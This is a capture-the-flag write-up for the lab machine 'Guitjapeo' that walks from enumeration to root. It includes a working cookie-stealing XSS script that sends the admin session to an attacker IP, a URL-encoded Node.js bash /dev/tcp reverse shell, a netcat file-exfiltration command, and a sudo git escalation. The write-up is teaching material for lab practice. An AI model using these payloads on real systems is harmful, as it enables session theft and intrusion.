---
author: Lenam  
pubDatetime: 2024-09-25T15:22:00Z
title: WriteUp Guitjapeo - TheHackersLabs  
slug: guitjapeo-writeup-thehackerslabs-en
featured: true  
draft: false  
ogImage: "assets/guitjapeo/OpenGraph.png"  
tags:
  - writeup
  - TheHackersLabs
  - XSS
  - Content Security Policy
  - Session Hijacking
  - HttpOnly
  - GIT
description:  
  CTF where we'll need to code, learn about git, and create a GitHub account.
lang: en  
---

CTF where we'll need to code, learn about git, and create a GitHub account.

![alt text](/assets/guitjapeo/image.png)

I hope you find it enjoyable.

## Table of contents

## Enumeration

```bash
└─$ nmap -p- -n -Pn 192.168.1.173                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 04:09 CEST
Nmap scan report for 192.168.1.173
Host is up (0.00048s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 4.13 seconds
```

```bash
┌──(kali㉿kali)-[~/CTFs/TheHackersLabs/guitjapeo]
└─$ sudo nmap -p22,80,443 -sCV -T4 -n -Pn 192.168.1.173 -o nmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 04:13 CEST
Nmap scan report for 192.168.1.173
Host is up (0.00070s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 ae:f7:30:5e:e8:28:bb:0e:cd:8e:5e:9c:33:f0:0a:cd (ECDSA)
|_  256 04:50:bf:6f:21:23:ba:3a:c0:d2:89:d3:19:60:b1:03 (ED25519)
80/tcp  open  http     nginx 1.22.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
443/tcp open  ssl/http nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: Custom Animation
| ssl-cert: Subject: commonName=guitjapeo.thl/organizationName=Company/stateOrProvinceName=State/countryName=US
| Not valid before: 2024-09-21T01:00:07
|_Not valid after:  2025-09-21T01:00:07
MAC Address: 08:00:27:B3:F9:E1 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
```

We find a web service with the domain `guitjapeo.thl`, add it to the hosts file, and try to access it, the default virtualhost and the virtualhosts on port 80 redirect us to `https://guitjapeo.thl` on port 443 with a self-signed certificate.

```bash
┌──(kali㉿kali)-[~/CTFs/TheHackersLabs/guitjapeo]
└─$ sudo nano /etc/hosts                                           
                                                                                                              
┌──(kali㉿kali)-[~/CTFs/TheHackersLabs/guitjapeo]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
192.168.1.173   guitjapeo.thl
```

![guitjapeo.thl](/assets/guitjapeo/image-1.png)

We scan this website.

```bash
┌──(kali㉿kali)-[~/CTFs/TheHackersLabs/guitjapeo]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://guitjapeo.thl -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://guitjapeo.thl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 808]
/register             (Status: 200) [Size: 795]
/css                  (Status: 301) [Size: 153] [--> /css/]
/Login                (Status: 200) [Size: 808]
/js                   (Status: 301) [Size: 152] [--> /js/]
/messages             (Status: 302) [Size: 28] [--> /login]
/logout               (Status: 302) [Size: 28] [--> /login]
/Register             (Status: 200) [Size: 795]
/Logout               (Status: 302) [Size: 28] [--> /login]
/Messages             (Status: 302) [Size: 28] [--> /login]
/LogIn                (Status: 200) [Size: 808]
/LOGIN                (Status: 200) [Size: 808]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
```

## Enumeration 2

We enter `https://guitjapeo.thl/register` and create a user.

![alt text](/assets/guitjapeo/image-2.png)

and validate our user at `https://guitjapeo.thl/login`. We manage to enter `https://guitjapeo.thl/messages`.

![alt text](/assets/guitjapeo/image-3.png)

We see there's a kind of API where messages are sent, and a list of users is read among other things; we continue searching with gobuster in the API path.

```bash
┌──(kali㉿kali)-[~/CTFs/TheHackersLabs/guitjapeo]
└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://guitjapeo.thl/api -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://guitjapeo.thl/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info                 (Status: 200) [Size: 188]
/users                (Status: 302) [Size: 28] [--> /login]
/messages             (Status: 302) [Size: 28] [--> /login]
/Info                 (Status: 200) [Size: 188]
/Users                (Status: 302) [Size: 28] [--> /login]
/command              (Status: 302) [Size: 28] [--> /login]
/Command              (Status: 302) [Size: 28] [--> /login]
/Messages             (Status: 302) [Size: 28] [--> /login]
/INFO                 (Status: 200) [Size: 188]
Progress: 77150 / 220560 (34.98%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 77299 / 220560 (35.05%)
===============================================================
Finished
===============================================================
```

We find other interesting endpoints, visit the endpoint `/api/info` and it returns a JSON with headers.

![alt text](/assets/guitjapeo/image-4.png)

## Cookie Hijacking

In the message form, we can send a URL. It seems that in the dropdown menu, we can select the user to whom we want to send a message. All the users we created and the "Administrator" user appear. We try sending a URL to the administrator to see if they visit it, so we can capture their cookie.

We first check by sending a URL with our machine's IP and a Python HTTP service.

![alt text](/assets/guitjapeo/image-5.png)

It appears that the "Administrator" user is visiting all the links sent through the application. If we try to read the session cookie, we can't because it is set to "HttpOnly," which prevents reading the cookie from the browser; it can only be read from the server side.

![alt text](/assets/guitjapeo/image-6.png)

This is solvable by using the `/api/info` endpoint, which allows us to read the headers, including the cookies.

### XSS

To hijack the cookie, we first need to be able to read it, for which we need an XSS found on the main page. However, it has Content Security Policy (CSP) headers configured that make the task difficult.

```
Content-Security-Policy: default-src 'self' 'unsafe-inline'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self'; object-src 'none'; frame-src 'none'; connect-src 'self'; upgrade-insecure-requests; base-uri 'self'; form-action 'self'; frame-ancestors 'self'; script-src-attr 'none'
```

First, we conduct tests to try to read our own cookie. As seen in the CSP header, scripts can be loaded from the domain `https://cdn.jsdelivr.net`, which allows us to load scripts from our GitHub repository using the following URL format:

```
https://cdn.jsdelivr.net/gh/{GITHUB_USER}/{REPO}@{BRANCH}/{FILE_PATH}
```

If we haven't yet, we create a GitHub account, set up a repository, and add the following JavaScript file. Replace the IP with your attacking machine's IP.

```javascript
// cookies.js
var req = new XMLHttpRequest();
req.onload=reqListener;
var url="https://guitjapeo.thl/api/info";
req.withCredentials=true;
req.open("GET",url,false);
req.send();
function reqListener() {
    var req2=new XMLHttpRequest();
    const sess=JSON.parse(this.responseText).cookie;
    location.href="http://192.168.1.116/?data="+btoa(sess);
};
```

My GitHub user is `Len4m`, the repo I've created is `temp`, and the branch is `main`. Therefore, the URL to my script through the CDN of jsdelivr is:

```url
https://cdn.jsdelivr.net/gh/Len4m/temp@main/cookies.js
```

We start listening with an HTTP service on port 80 on our attacking machine. Then, in the "Custom Animation Content" form on the main page, we insert the following code and send it:

```html
<script src="https://cdn.jsdelivr.net/gh/Len4m/temp@main/cookies.js"></script>
```

We manage to obtain our own session cookie.

```bash
┌──(kali㉿kali)-[~/CTFs/TheHackersLabs/guitjapeo]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.116 - - [21/Sep/2024 05:19:40] "GET /?data=Y29ubmVjdC5zaWQ9cyUzQUJDelBJRmVvdEM0YlBCMnRrNkpERGVkSFF2U192cG1aLjBiV09tNDdJUTYwRjdTJTJCdkxMTFVDM2RpcHlMUGdKVDZxWWdMTkFwbXlzbw== HTTP/1.1" 200 -

┌──(kali㉿kali)-[~/CTFs/TheHackersLabs/guitjapeo]
└─$ echo Y29ubmVjdC5zaWQ9cyUzQUJDelBJRmVvdEM0YlBCMnRrNkpERGVkSFF2U192cG1aLjBiV09tNDdJUTYwRjdTJTJCdkxMTFVDM2RpcHlMUGdKVDZxWWdMTkFwbXlzbw== | base64 -d
connect.sid=s%3ABCzPIFeotC4bPB2tk6JDDedHQvS_vpmZ.0bWOm47IQ60F7S%2BvLLLUC3dipyLPgJT6qYgLNApmyso
```

### Obtaining Administrator Session

With the preparations made, we can now send a malicious URL to the Administrator user by following these steps:

- Send a message to the administrator with the malicious URL.
- The administrator clicks the link and loads the URL in their browser.
- The URL loads our script from GitHub.
- Our script connects to the `/api/info` endpoint to obtain the session cookie.
- The script redirects the administrator's browser to our attacking machine, sending a parameter `data` with the administrator's cookies encoded in base64.

We start listening on our attacking machine.

```
python3 -m http.server 80
```

We send a message to the administrator with the following URL...

```
https://guitjapeo.thl/?text=%3Cscript%20src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FLen4m%2Ftemp%40main%2Fcookies.js%22%3E%3C%2Fscript%3E
```

... and wait for them to click to receive their session cookie.

![alt text](/assets/guitjapeo/image-8.png)

We decode the base64 and add the session data to our session from the browser.

```
┌──(kali㉿kali)-[~]
└─$ echo Y29ubmVjdC5zaWQ9cyUzQTlhNU5rN1U4MjJqSjhzVHZaMG1kXzE3ek1kWVpSaFNLLld0bnZQeDFkV0xLTHY0bE9yNk9FUzFlMHdiNG9zVyUyRjAwOWs2QXVscVo1bw== | base64 -d
connect.sid=s%3A9a5Nk7U822jJ8sTvZ0md_17zMdYZRhSK.WtnvPx1dWLKLv4lOr6OES1e0wb4osW%2F009k6AulqZ5o 
```
We refresh the page after modifying the cookie, and now we are logged in as the Administrator.

![alt text](/assets/guitjapeo/image-9.png)

## RCE

Now as administrator, we have access to another endpoint `https://guitjapeo.thl/api/command/?cmd=clearUsers()`, it appears we can send commands with JavaScript. So, we set up a netcat listening on port 12345 and load the following URL in the browser or via curl with the administrator's cookie.

```bash
nc -lvnp 12345
```

URL-encode the following JavaScript

```javascript
require('child_process').exec('bash -c "/bin/bash -i >& /dev/tcp/192.168.1.116/12345 0>&1"')
```

and add it to the URL as

```
https://guitjapeo.thl/api/command/?cmd=require%28%27child_process%27%29.exec%28%27bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.116%2F12345%200%3E%261%22%27%29
```

![alt text](/assets/guitjapeo/image-10.png)

We obtain a shell as the user lenam.

## Privilege Escalation

We fix the tty and look at what we find in the application folder and what users are there. It seems easy since there's only the root user.

```bash
lenam@guitjapeo:~/.local/bin/web$ cat /etc/passwd|grep bash
root:x:0:0:root:/root:/bin/bash
lenam:x:1000:1000:,,,:/home/lenam:/bin/bash
lenam@guitjapeo:~/.local/bin/web$ ls -la
total 160
drwxr-xr-x   7 lenam lenam   4096 Sep 20 23:48 .
drwxr-xr-x   3 lenam lenam   4096 Sep 20 18:55 ..
-rw-r--r--   1 lenam lenam   2009 Sep 20 23:50 administrador.js


drwxr-xr-x   8 lenam lenam   4096 Sep 20 19:41 .git
-rw-r--r--   1 lenam lenam     13 Sep 20 19:39 .gitignore
-rw-r--r--   1 lenam lenam   5146 Sep 20 21:06 index.js
drwx------   8 lenam lenam   4096 Sep 21 00:30 isolated-data
drwxr-xr-x 224 lenam lenam  12288 Sep 20 19:38 node_modules
-rw-r--r--   1 lenam lenam    314 Sep 20 18:56 package.json
-rw-r--r--   1 lenam lenam 103530 Sep 20 19:38 package-lock.json
drwxr-xr-x   4 lenam lenam   4096 Sep 20 18:56 public
drwxr-xr-x   2 lenam lenam   4096 Sep 20 18:56 views
lenam@guitjapeo:~/.local/bin/web$ sudo -l
[sudo] password for lenam: 
```

The lenam user can execute something with sudo, but we don't have their password.

### Git History

We find a `.git` folder, and we search if there's anything in the repository history.

```bash
git log --name-only --oneline
```

![alt text](/assets/guitjapeo/image-11.png)

We find two files `archivo.zip` and `password.txt` that aren't in the application folder; we try to recover them.

```bash
lenam@guitjapeo:~/.local/bin/web$ git checkout ecdef85 -- archivo.zip password.txt
lenam@guitjapeo:~/.local/bin/web$ ls -l
total 192
-rw-r--r--   1 lenam lenam   2009 Sep 20 23:50 administrador.js
-rw-r--r--   1 lenam lenam  43766 Sep 21 00:38 archivo.zip
-rw-r--r--   1 lenam lenam   5146 Sep 20 21:06 index.js
drwx------   8 lenam lenam   4096 Sep 21 00:38 isolated-data
drwxr-xr-x 224 lenam lenam  12288 Sep 20 19:38 node_modules
-rw-r--r--   1 lenam lenam    314 Sep 20 18:56 package.json
-rw-r--r--   1 lenam lenam 103530 Sep 20 19:38 package-lock.json
-rw-r--r--   1 lenam lenam    157 Sep 21 00:38 password.txt
drwxr-xr-x   4 lenam lenam   4096 Sep 20 18:56 public
drwxr-xr-x   2 lenam lenam   4096 Sep 20 18:56 views
lenam@guitjapeo:~/.local/bin/web$ cat password.txt 
# This script is written in Python
def obtain_password():
    return ''.join([chr(ord(c) + 1) for c in '  ..lmruuuC^'])

print(obtain_password())
```

### ZIP File

We bring the files found in the git history, `archivo.zip` and `password.txt`, to our attacking machine.

On our attacking machine

```bash
nc -lvnp 2121 > archivo.zip
```

and on the victim machine inside the folder where `archivo.zip` and `password.txt` are located.

```bash
cat archivo.zip > /dev/tcp/192.168.1.116/2121
```

We do the same for the `password.txt` file.

The `password.txt` file contains a Python script that returns a password.

```bash
┌──(kali㉿kali)-[~/CTFs/TheHackersLabs/guitjapeo]
└─$ python password.txt    
!!//mnsvvvD_
```

With this password, we can unzip the ZIP file, which is protected with a password. Inside this file, we find another two files `archivo.zip` and `password.txt`.

The new ZIP file is still protected by a password, and the `password.txt` file this time contains a Ruby script.

```bash
┌──(kali㉿kali)-[~/CTFs/TheHackersLabs/guitjapeo/extract]
└─$ ls
archivo.zip  password.txt

┌──(kali㉿kali)-[~/CTFs/TheHackersLabs/guitjapeo/extract]
└─$ cat password.txt 
# This script is written in Ruby
def obtain_password
  password = 'c\\2.8\\R;"Kgn'.chars.map { |c| (c.ord + 1).chr }.join
  return password
end

puts obtain_password
```

We install Ruby if not already installed and run the `password.txt` file this time with Ruby, resulting in a password that allows us to unzip the next `archivo.zip`, where we again find a `password.txt` with a JavaScript script that returns a password allowing us to unzip the next ZIP. This continues in a chain, one ZIP file inside another with its password with a script in a different scripting language.

We have detected scripts in `Python`, `JavaScript`, `Ruby`, and `PHP`; we install the necessary components to run these scripting languages on our computer. Each `password.txt` file has a comment in the first line indicating the type of script.

We also detect that the depth is very long and manually doing this would take a lot of time, so we prepare a Python script with the help of ChatGPT and manual modifications to unzip all the chained files, executing each script from each `password.txt` to obtain the password and unzip the next file.

```python
import pyzipper
import subprocess
import os
import sys
import shutil

def execute_script(script_path):
    # Read the first comment to identify the language
    with open(script_path, 'r', encoding='utf-8') as f:
        first_line = f.readline().strip()
        script_content = f.read()

    if 'Python' in first_line:
        # Execute the script in Python
        result = subprocess.run(['python', script_path], capture_output=True, text=True)
    elif 'JavaScript' in first_line:
        # Execute the script in JavaScript using Node.js
        result = subprocess.run(['node', script_path], capture_output=True, text=True)
    elif 'Ruby' in first_line:
        # Execute the script in Ruby
        result = subprocess.run(['ruby', script_path], capture_output=True, text=True)
    elif 'PHP' in first_line:
        # Execute the script in PHP
        result = subprocess.run(['php', script_path], capture_output=True, text=True)
    else:
        print(f"Script language not recognized in {script_path}")
        sys.exit(1)

    if result.returncode != 0:
        print(f"Error executing script {script_path}:")
        print(result.stderr)
        sys.exit(1)

    # The password is the output of the script
    password = result.stdout.strip()
    return password

def extract_zip(zip_path, password, extract_to):
    try:
        with pyzipper.AESZipFile(zip_path, 'r') as zf:
            zf.pwd = password.encode('utf-8')
            zf.extractall(path=extract_to)
    except RuntimeError as e:
        print(f"Error extracting {zip_path}: {e}")
        sys.exit(1)
    except pyzipper.zipfile.BadZipFile as e:
        print(f"Corrupt ZIP file: {zip_path}")
        sys.exit(1)

def automate_extraction(initial_zip, initial_password):
    current_zip = initial_zip
    current_password = initial_password
    level = 1

    # Create a temporary directory for extraction
    temp_dir = 'temp_extraction'
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(temp_dir)

    while True:
        print(f"\nLevel {level}:")
        extract_to = os.path.join(temp_dir, f'level_{level}')
        os.makedirs(extract_to, exist_ok=True)

        # Extract the ZIP file
        extract_zip(current_zip, current_password, extract_to)

        # Check if there's an 'archivo.zip' inside
        next_zip_path = os.path.join(extract_to, 'archivo.zip')
        password_txt_path = os.path.join(extract_to, 'password.txt')

        if not os.path.exists(password_txt_path):
            print("No 'password.txt' found. Process ended.")
            break

        if not os.path.exists(next_zip_path):
            # Last level reached
            print(f"Last level reached at level {level}.")
            with open(password_txt_path, 'r', encoding='utf-8') as f:
                content = f.read()
            print("\nContent of the last 'password.txt':")
            print(content)
            break

        # Execute the script in 'password.txt' to obtain the next password
        next_password = execute_script(password_txt_path)
        print(f"Password obtained: {next_password}")

        # Prepare for the next level
        current_zip = next_zip_path
        current_password = next_password
        level += 1

    # Optional: remove the temporary directory


    shutil.rmtree(temp_dir)
    print("\nProcess completed.")

if __name__ == "__main__":
    # Request the initial password from the user
    initial_password = input("Enter the initial password for 'archivo.zip': ").strip()
    initial_zip = 'archivo.zip'

    if not os.path.exists(initial_zip):
        print(f"'{initial_zip}' not found in the current directory.")
        sys.exit(1)

    # Run the automatic extraction
    automate_extraction(initial_zip, initial_password)
```

We install the script dependencies, in my case, I only had to install `pyzipper` with `pip`, save the script in the same folder as the files `archivo.zip` and `password.txt`, and run it.

The script asks us for the first password, but the rest it does automatically.

```bash
┌──(kali㉿kali)-[~/CTFs/TheHackersLabs/guitjapeo]
└─$ python3 crackzip.py
Enter the initial password for 'archivo.zip': !!//mnsvvvD_

Level 1:
Password obtained: d]3/9]S<#Lho

Level 2:
Password obtained: 5ifBA*TIu{p@

Level 3:
Password obtained: QWr8g_YUxB5w

Level 4:
Password obtained: p+Fl4|!<I}>{

Level 5:
Password obtained: TU$Z$v1W^poj

Level 6:
Password obtained: O_`+^u]aPqRb

Level 7:
Password obtained: GA.]Y:8^dlNO

...
...

Level 100:
Last level reached at level 100.

Content of the last 'password.txt':
The last password is: {[XY2P_oODN)

Process completed.
```

### Sudo Git

We obtain lenam's password `{[XY2P_oODN)`, and now we can execute the sudo command.

```bash
lenam@guitjapeo:~/.local/bin/web$ sudo -l 
[sudo] password for lenam: 
Matching Defaults entries for lenam on guitjapeo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User lenam may run the following commands on guitjapeo:
    (root) /usr/bin/git
```

We see that we can execute the command `git` (as it couldn't be any other way) as the user root.

![alt text](/assets/guitjapeo/image-12.png)

In GTFOBins, we find this binary, which shows us some ways to use it to elevate privileges; some use the manual or help with `less`, which won't work because the git manuals are not installed.

Option (e) works correctly for us.

```bash
TF=$(mktemp -d)
ln -s /bin/sh "$TF/git-x"
sudo git "--exec-path=$TF" x
```

We execute it and obtain a shell as root.

```bash
lenam@guitjapeo:~/.local/bin/web$ TF=$(mktemp -d)
lenam@guitjapeo:~/.local/bin/web$ ln -s /bin/sh "$TF/git-x"
lenam@guitjapeo:~/.local/bin/web$ sudo git "--exec-path=$TF" x
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
f6aXXXXXXXXXXXXXXXXXXXXXXbb
```